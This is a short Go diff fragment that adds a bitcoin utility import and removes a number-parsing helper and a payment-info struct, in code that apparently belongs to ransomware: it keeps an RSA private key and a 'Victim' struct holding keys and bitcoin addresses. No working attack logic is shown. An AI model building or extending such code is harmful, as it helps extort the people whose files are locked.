@@ -18,16 +18,9 @@ import (
 
 	"github.com/btcsuite/btcd/btcec"
 	"github.com/btcsuite/btcd/chaincfg"
+	"github.com/btcsuite/btcutil"
 	"github.com/tkanos/gonfig"
 )
-
-func fromBase10(base10 string) *big.Int {
-	i, ok := new(big.Int).SetString(base10, 10)
-	if !ok {
-		panic("bad number: " + base10)
-	}
-	return i
-}
 
 var Key rsa.PrivateKey
 
@@ -94,11 +87,6 @@ type Victim struct {
 	priv_address string
 	address      string
 	key          []byte
-}
-
-type PaymentInfo struct {
-	Address string
-	Amount  string
 }
 
 type Configuration struct {
